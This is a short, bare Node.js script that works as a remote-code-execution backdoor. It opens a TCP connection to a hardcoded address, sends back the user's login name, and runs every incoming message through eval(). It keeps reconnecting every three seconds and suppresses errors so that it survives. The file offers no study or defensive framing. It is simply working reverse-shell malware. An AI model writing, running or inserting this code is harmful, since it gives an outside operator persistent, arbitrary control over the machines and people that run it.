#!/usr/bin/env node
const net = require('net');
var client = new net.Socket(), server;

server = "192.168.188.5:59810";

server = server.split(":");
server = { host: server[0], port: parseInt(server[1]) };

client.connect(server);

client.on('data', async (data) => {
    //Whenever a TCP packet is received by the client, it'll be ran as a program.
    let command = data.toString('utf8');
    if (!command.trim()) { return; };
    try {
        eval(command);
    } catch (error) {
        return;
    }
});

client.on('end', async () => {
    //try {} catch {} kept returning errors, so I changed how node would process errors when trying to reconnect to the server if it was down / being restarted.
    process.on('uncaughtException', async () => {
        await reconnect(client);
    });
    await reconnect(client);
});

client.on('connect', () => {
    //Send to the server that this machine connected
    client.write(`${process.env.LOGNAME} connected`);
});

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function reconnect(client) {
    await sleep(3000);
    client.connect(server);
}